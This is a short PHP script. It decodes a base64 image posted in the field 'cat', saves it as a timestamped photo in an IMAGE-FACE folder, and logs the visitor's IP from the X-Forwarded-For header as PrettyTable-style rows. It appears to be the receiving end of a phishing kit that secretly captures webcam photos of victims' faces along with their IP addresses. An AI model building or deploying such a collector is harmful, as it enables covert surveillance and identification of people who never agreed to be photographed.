<?php
$ip =  $_SERVER['HTTP_X_FORWARDED_FOR'];
file_put_contents("log.log", "");

$num = shell_exec('find ../IMAGE-FACE/. -type f | wc -l');
$date = date('d|M|Y|H|i|s');
$imageData=$_POST['cat'];


$filteredData=substr($imageData, strpos($imageData, ",")+1);
$unencodedData=base64_decode($filteredData);
$fp = fopen( '../IMAGE-FACE/photo'.$date.'.png', 'wb' );
fwrite( $fp, $unencodedData);
fclose( $fp );
$num=$num+1;

$file = $_SERVER['DOCUMENT_ROOT']."/log.log";
$all = "\r\nx.add_row(['PHOTO', '$num','$ip'])";
$fp = fopen("$file", "a+");
fwrite($fp, $all);
fclose($fp);

exit();
?>